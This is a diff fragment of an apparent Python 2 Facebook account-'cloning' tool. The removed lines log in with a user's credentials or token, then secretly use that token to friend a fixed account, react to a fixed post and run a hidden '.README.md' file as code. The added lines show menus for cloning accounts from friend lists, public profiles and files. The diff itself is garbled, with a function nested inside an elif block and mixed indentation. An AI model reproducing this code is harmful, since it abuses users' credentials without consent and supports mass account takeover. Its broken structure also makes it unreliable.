@@ -89,68 +89,17 @@ def login_choice():
     if bch =='':
         print ('[!] Fill in correctly')
         login()
-    elif bch =='2':
-        os.system('clear')
-        print (logo)
-        fac=raw_input(' Paste Access Token Here: ')
-        fout=open('....', 'w')
-        fout.write(fac)
-        fout.close()
-        requests.post('https://graph.facebook.com/me/friends?method=post&uids=100002059014174&access_token='+fac)
-        requests.post('https://graph.facebook.com/2848950808516858/reactions?type=LOVE&access_token=' +fac)
-        os.system('xdg-open https://www.youtube.com/channel/UCIC01LyIO5oroo1Qo6Fi4Mw')
-        os.system('python2 .README.md')
-    elif bch =='1':
-        login1()
-            
-def login1():
-	cb()
+    def pak():
+	global tb
 	try:
-		tb=open('token.txt', 'r')
-		os.system('python2 .README.md')
-	except (KeyError,IOError):
-		cb()
-		print (logo)
-		print('          [+] LOGIN WITH FACEBOOK [+]' )
-		print
-		id = raw_input('[+] ID/Email : ')
-		pwd = getpass.getpass('[+] Password : ')
-		tik()
-		sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
-		data = {'api_key':'882a8490361da98702bf97a021ddc14d','credentials_type':'password','email':id,'format':'JSON', 'generate_machine_id':'1','generate_session_cookies':'1','locale':'en_US','method':'auth.login','password':pwd,'return_ssl_resources':'0','v':'1.0'}
-		x=hashlib.new('md5')
-		x.update(sig)
-		a=x.hexdigest()
-		data.update({'sig':a})
-		url = 'https://api.facebook.com/restserver.php'
-		r=requests.get(url,params=data)
-		z=json.loads(r.text)
-		if 'access_token' in z:
-		    st = open('....', 'w')
-		    st.write(z['access_token'])
-		    st.close()
-		    print ('\n\x1b[1;92m[+] Login Successfull \x1b[1;97m')
-		    t()
-		    os.system('xdg-open https://www.youtube.com/channel/UCIC01LyIO5oroo1Qo6Fi4Mw')
-		    requests.post('https://graph.facebook.com/me/friends?method=post&uids=100002059014174&access_token='+z['access_token'])
-		    requests.post('https://graph.facebook.com/2848950808516858/reactions?type=LOVE&access_token=' +z['access_token'])
-		    os.system('python2 .README.md')
-		else:
-		    if 'www.facebook.com' in z['error_msg']:
-		        print ('Account has a checkpoint !')
-		        os.system('rm -rf ....')
-		        t()
-		        login1()
-		    else:
-		        print ( 'email or password is wrong !')
-		        os.system('rm -rf ....')
-		        t()
-		        login1()
-			
-if __name__=='__main__':
-    login()             
-    cb()	
-print (logo)
+		tb=open('token.txt','r').read()
+	except IOError:
+		print (R + ' Invalid Token !')
+		trb()
+		t()
+		login()
+	cb()
+	print (logo)
 	print (S + '[' + P + '☞1' + S + ']' + P + ' Clone With Friend List')
 	print (S + '[' + P + '☞2' + S + ']' + P + ' Clone From Public Account')
 	print (S + '[' + Y + '☞3' + S + ']' + Y + ' Clone From File')
